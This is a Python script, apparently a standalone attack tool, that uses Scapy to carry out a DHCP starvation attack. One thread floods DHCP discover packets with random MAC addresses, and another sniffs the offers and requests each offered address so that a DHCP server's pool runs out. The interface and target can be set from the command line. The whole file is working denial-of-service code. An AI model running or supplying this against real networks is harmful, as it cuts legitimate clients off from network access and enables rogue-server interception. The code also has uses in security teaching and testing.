import argparse
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether

interface = 'eth0'
target = "255.255.255.255"


def send_dhcp_discover():
    """
    Sends a DHCP discover packet.
    """
    global interface
    global target

    dhcp_discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst=target) /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=RandMAC()) /
            DHCP(options=[("message-type", "discover"), "end"])
    )

    sendp(dhcp_discover, iface=interface, verbose=1)


def handle_dhcp_packet(rcv_packet):
    """
    Callback function to handle DHCP packets.

    Args:
        rcv_packet: Received packet.
    """
    if DHCP in rcv_packet and rcv_packet[DHCP].options[0][1] == 2:  # Check if it's a DHCP offer
        process_dhcp_offer(rcv_packet)


def packet_callback(rcv_packet):
    """
    Callback function to handle received packets.
    Creates a new thread to handle the packet

    Args:
        rcv_packet: Received packet.
    """
    packet_thread = threading.Thread(target=handle_dhcp_packet, args=(rcv_packet,))
    packet_thread.start()


def dhcp_sniffer():
    """
    Starts the DHCP sniffer.
    """
    sniff(filter="udp and (port 67 or port 68)", prn=packet_callback)


def dhcp_flooder():
    """
    Floods DHCP discover packets.
    """
    while True:
        send_dhcp_discover()
        time.sleep(5)  # Scapy sniffer is not designed to be superfast, so it can miss packets sometimes.


def send_dhcp_request(mac, requested_ip):
    """
    Sends a DHCP request packet.

    Args:
        mac: MAC address.
        requested_ip: Requested IP address.
    """
    global interface
    global target
    # Create a DHCP request packet
    dhcp_request = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst=target) /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac) /
            DHCP(options=[("message-type", "request"),
                          ("requested_addr", requested_ip), "end"])
    )

    # Send the packet
    sendp(dhcp_request, iface=interface, verbose=0)


def extract_mac_and_ip(rcv_packet):
    """
    Extracts MAC address and offered IP from a DHCP packet.

    Args:
        rcv_packet: Received DHCP packet.

    Returns:
        Tuple containing MAC address and offered IP.
    """
    mac_address = rcv_packet[BOOTP].chaddr
    offered_ip = rcv_packet[IP].dst

    return mac_address, offered_ip


def process_dhcp_offer(rcv_packet):
    """
    Processes DHCP offer packets.

    Args:
        rcv_packet: Received DHCP packet.
    """
    mac_address, offered_ip = extract_mac_and_ip(rcv_packet)

    send_dhcp_request(mac_address, offered_ip)


def main():
    global interface
    global target
    parser = argparse.ArgumentParser(description="DHCP Starvation")
    parser.add_argument("-i", "--iface", help="Interface you wish to use")
    parser.add_argument("-t", "--target", help="IP of target server")

    args = parser.parse_args()

    if args.iface:
        interface = args.iface

    if args.target:
        target = args.target

    # Create and start the sniffer thread
    sniffer_thread = threading.Thread(target=dhcp_sniffer)
    sniffer_thread.start()

    # Create and start the flooder thread
    flooder_thread = threading.Thread(target=dhcp_flooder)
    flooder_thread.start()

    # Wait for both threads to finish (optional)
    sniffer_thread.join()
    flooder_thread.join()


if __name__ == "__main__":
    main()